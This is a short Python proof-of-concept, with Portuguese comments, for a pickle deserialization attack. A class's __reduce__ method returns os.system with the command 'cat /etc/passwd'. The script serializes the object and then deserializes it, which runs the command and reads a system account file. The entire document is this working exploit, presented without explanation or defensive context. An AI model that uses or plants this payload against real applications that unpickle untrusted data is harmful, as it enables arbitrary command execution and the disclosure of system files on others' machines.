import pickle
import os
import sys

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

# Serializando o objeto malicioso
malicious_pickle = pickle.dumps(RCE())

# Desserializando o objeto malicioso
pickle.loads(malicious_pickle)
